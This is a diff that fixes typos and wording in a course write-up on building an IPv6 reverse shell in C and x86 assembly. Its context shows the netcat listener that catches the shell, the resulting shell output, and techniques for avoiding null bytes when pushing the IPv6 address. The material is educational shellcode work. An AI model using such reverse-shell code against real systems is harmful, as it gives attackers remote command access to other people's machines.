@@ -1,4 +1,4 @@
-# Note
+# Note
 
 This MD file has been created for the SecurityTube Linux Assembly Expert certification (https://www.pentesteracademy.com/course?id=3). Student ID: 1483.
 
@@ -6,7 +6,7 @@ All these examples have been tested on real public IPv6 address over the Interne
 
 # IPv6
 
-Lets try to change the code in order to remotely connect to an IPv6 address:
+Let's try to change the code in order to remotely connect to an IPv6 address:
 
 ```C
 #include <sys/socket.h>
@@ -44,7 +44,7 @@ In another terminal, let's compile and run the program in order to check it.
 $ gcc reverse_shell_ipv6.c -o C-reverse6
 $ ./C-reverse6 
 ```
-Connexion is done in our first terminal
+Connection is done in our first terminal
 
 ```
 $ nc -6 -lv 4444
@@ -54,7 +54,7 @@ uid=1000(cervoise) gid=1000(cervoise) groups=1000(cervoise),4(adm),24(cdrom),27(
 exit
 ```
 
-# ASM
+# ASM
 
 Changes in the previous code are:
  * using a *sockaddr_in6* structure
@@ -67,9 +67,9 @@ The only change will be to push a real IPv6 address.
 
 # Pushing 2a02:b0c0:1:e0:0:0:6ae:2002
 
-The choosen address is 2a02:b0c0:1:e0:0:0:6ae:2002 (or 2a02:b0c0:1:e0::6ae:2002). This is not the real IPv6 address used for the tests.
+The chosen address is 2a02:b0c0:1:e0:0:0:6ae:2002 (or 2a02:b0c0:1:e0::6ae:2002). This is not the real IPv6 address used for the tests.
 
-It is interessant because there is some null bytes in it. If we do not have to avoid null bytes, this address will be pushed like below:
+It is important because there are null bytes in it. If we do not have to avoid null bytes, this address will be pushed like below:
 
 ```ASM
 	push 0x0220ae06 ;6ae:2002
@@ -78,7 +78,7 @@ It is interessant because there is some null bytes in it. If we do not have to a
 	push 0xc0b0022A ; 2a02:b0c0
 ```
 
-The *push 0x00000000* can be replace by a *push eax*
+The *push 0x00000000* can be replaced by a *push eax*
 
 As it is not possible to push AL, let's play with registers in order to push *0001:00e0* on the stack:
 
